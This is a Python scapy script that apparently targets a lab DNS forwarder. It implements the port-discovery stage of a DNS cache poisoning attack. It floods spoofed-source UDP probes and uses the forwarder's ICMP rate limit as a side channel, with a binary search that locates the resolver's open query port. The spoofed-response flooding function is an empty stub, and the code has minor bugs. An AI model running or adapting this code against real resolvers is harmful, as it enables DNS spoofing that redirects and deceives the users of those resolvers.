import dns.resolver
import socket
from scapy.all import *
import random
import time
import threading
import collections
from ipaddress import IPv6Network, IPv6Address
from functools import wraps


lock = threading.Lock()

def get_random_domain():
    '''
    Return a random domain name from top 10K sites listed on the file
    '''

    random.seed(time.time())
    filepath = 'opendns-top-domains.txt'
    domain_names = []
    with open(filepath) as fp:
        for cnt, line in enumerate(fp):
            domain_names.append(line)
    return random.choice(domain_names)

"""
Generate a random IPv6 address for a specified subnet
"""
def random_ipv6_address():
    subnet = 'fe80:800:27ff::/64'

    random.seed(time.time())
    network = IPv6Network(subnet)
    address = IPv6Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))

    print(address)
    return address

forwarder_ip = '192.168.58.2'
forwarder_port = 53
domain_name = "cool.com"
local_free_ip = []

ICMP_limit_rate = 50
ICMP_recovering_time = .02

finished = 0
got_answer = 0

global_socket = conf.L3socket(iface='vboxnet2')


#https://stackoverflow.com/a/58135538/3450691
# To count time elapsed by a function

PROF_DATA = collections.defaultdict(list)

def profile(fn):
    @wraps(fn)
    def with_profiling(*args, **kwargs):
        start_time = time.process_time()
        ret = fn(*args, **kwargs)
        elapsed_time = time.process_time() - start_time
        PROF_DATA[fn.__name__].append(elapsed_time)
        return ret
    return with_profiling

Metrics = collections.namedtuple("Metrics", "sum_time num_calls min_time max_time avg_time fname")

def print_profile_data():
    results = []
    for fname, elapsed_times in PROF_DATA.items():
        num_calls = len(elapsed_times)
        min_time = min(elapsed_times)
        max_time = max(elapsed_times)
        sum_time = sum(elapsed_times)
        avg_time = sum_time / num_calls
        metrics = Metrics(sum_time, num_calls, min_time, max_time, avg_time, fname)
        results.append(metrics)
    total_time = sum([m.sum_time for m in results])
    print("\t".join(["Percent", "Sum", "Calls", "Min", "Max", "Mean", "Function"]))
    for m in sorted(results, reverse=True):
        print("%.1f\t%.3f\t%d\t%.3f\t%.3f\t%.3f\t%s" % 
        (100 * m.sum_time / total_time, m.sum_time, m.num_calls, m.min_time, m.max_time, m.avg_time, m.fname))
    print ("%.3f Total Time" % total_time)

def clear_profile_data():
    global PROF_DATA
    PROF_DATA = {}


def initialize():
    # Initialize local_free_ip list
    local_ip_base = '192.168.58.'
    start = 5
    end = 254
    now = start
    while now <= end:
        local_free_ip.append(local_ip_base + str(now))
        now += 1
    #print (local_free_ip)
    print (len(local_free_ip))

class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        filehandle = open("logfile.log", "w")
        filehandle.close()
    
    def write(self, message):
        with open("logfile.log", "a", encoding='utf-8') as self.log:
            self.log.write(message)
        self.terminal.write(message)
    
    def flush(self):
        pass

def answer_callback(packet):
    print("<<<<<<<<<<<<<<<<<<answer found.>>>>>>>>>>>>>>>>>>>>>>")
    print(pakcet.show())
    global got_answer
    got_answer = 1

def step1():

    global got_answer
    got_answer = 0

    my_ip = '192.168.58.1'
    my_port = 9554

    ip_layer = IP(dst=forwarder_ip, src=my_ip)
    udp_layer = UDP(dport=forwarder_port, sport=my_port)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))

    packet = Ether() / ip_layer / udp_layer / dns_layer
        
    #ret = sr1(packet, verbose=True)
    global_socket.send(packet)

    return

# We are going to use this for infering the actual source port also,
# that's why adding another parameter 'number_of_padding_packet'
@profile
def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):

    print("do_one_attack_chunk " + str(port_start) + "," + str(number_of_probe_packet) +
            "," + str(number_of_padding_packet))
    

    #print("Sleeping for 50ms")
    time.sleep(0.05)

    start_time = time.process_time()

    now_port = port_start

    # generate all probe packets, padding_packets (if any) and the verification packet first
    # and then send those in a burst
    probe_packet = []

    for i in range(number_of_probe_packet):
        # Using spoofed ip
        ip_layer = IP(dst=forwarder_ip, src=RandIP())
        udp_layer = UDP(dport=now_port, sport=RandShort())
        packet = ip_layer / udp_layer
        probe_packet.append(packet)
        now_port += 1

    padding_packet = []

    for i in range(number_of_padding_packet):
        # Using spoofed ip
        ip_layer = IP(dst=forwarder_ip, src=RandIP())
        udp_layer = UDP(dport=1, sport=RandShort())
        packet = ip_layer / udp_layer
        padding_packet.append(packet)

    ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = ip_layer / udp_layer

    elapsed_time = time.process_time() - start_time
    print ("Time needed for generating packets: " + str(elapsed_time))

    # improving scapy's packet sending performance
    # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html


    start_time = time.process_time()
    for packet in probe_packet:
        #send(packet, verbose=False)
        global_socket.send(packet)
    for packet in padding_packet:
        #send(packet, verbose=False)
        global_socket.send(packet)
    elapsed_time = time.process_time() - start_time
    print ("Time needed for sending 50 packets: " + str(elapsed_time))

    #print("Sending verification packet")

    start_time = time.process_time()

    # This timeout is the crucial factor
    reply = sr1(verification_packet, timeout=.6, verbose=False) # in seconds

    elapsed_time = time.process_time() - start_time
    print ("Time needed for sending and receiving verification packet: " + str(elapsed_time))
    #print("Got reply from verificaiton packet")
    #print (reply.show())


    # if timeout occurs even then the reply will be none
    if reply == None:
        print ("No port is open. IMCP rate limit is already drained.")
        return -1
    else:
        if reply.haslayer(ICMP):
            # Maybe need to check the error code also
            print("Yaaay, got ICMP port unreachable message. At least one port is open.")
            #print (reply[ICMP].summary())
            #print (reply[ICMP].show())
            return port_start # important for the base condition of the binary search
        elif reply.haslayer(UDP):
            print("Don't know what this means.")
        else:
            print("Unknown reply")

    return 0 # for now

# dividing range into [left...mid] and [mid + 1...right]
def binary_search(left, right):
    mid = left + (right - left) // 2 #integer division
    print(mid)
    if left == right:
        return do_one_chunk_of_attack(left, 1, ICMP_limit_rate - 1)

    # check the calculations carefully again
    ret1 = do_one_chunk_of_attack(left, mid - left + 1, ICMP_limit_rate - (mid - left + 1))
    if ret1 == left:
        return binary_search(left, mid)

    ret2 = do_one_chunk_of_attack(mid + 1, right - mid, ICMP_limit_rate - (right - mid))
    if ret2 == mid + 1:
        return binary_search(mid + 1, right)

    # Maybe the source port was closed in the time of binary searching
    return -1

def find_the_exact_port(start_port, number_of_ports):
    ret = binary_search(start_port, start_port + number_of_ports - 1)
    print ("port found : " + str(ret))
    return ret

def flood_the_port_with_spoofed_dns_response(actual_port):
    None

def step2(source_port_range_start, source_port_range_end):
    #need to run this file with sudo because of port 53
    
    start = source_port_range_start

    while got_answer == False and start + ICMP_limit_rate <= source_port_range_end:
        #print("lock status: " + str(lock.locked()))

        #for system wide time count + sleep also
        #another option was time.process_time() (check)
        start_time_one_chunk = time.perf_counter()
        start_time = time.process_time()
        
        #print("Calling do_one_attack_chunk")
        ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
        print("Got reply from do_one_attack_chunk : " + str(ret))

        if ret > 0: # got an ICMP reply
            port = find_the_exact_port(start, ICMP_limit_rate)

            # found the port
            if port != -1:
                result = flood_the_port_with_spoofed_dns_response(port)
                if result == True:
                    finished = 1
                    return

        
        end_time_one_chunk = time.perf_counter()
        end_time = time.process_time()
        time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
        time_elapsed = end_time - start_time

        #if (time_elapsed_for_one_chunk < ICMP_recovering_time)
        #    time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
        print ("System wide time needed in this loop: " + str(time_elapsed_for_one_chunk))
        print ("Process wide time needed in this loop: " + str(time_elapsed))

        start += ICMP_limit_rate

    print_profile_data()

    # Either actual dns response has been reached or tried all source ports
    return False

def main():

    initialize()

    sys.stdout = Logger()
    
    iteration = 1


    t = AsyncSniffer(iface="vboxnet2",
        filter="dst port 9554 and udp", prn=answer_callback)

    t.start()

    while finished == 0:

        print ("----------Iteration " + str(iteration) + " is starting.----------")

        step1()
        step2(32768, 60999)

        print ("----------Iteration " + str(iteration) + " is completed.----------\n")

        iteration += 1

    t.stop()

if __name__ == "__main__":
    main()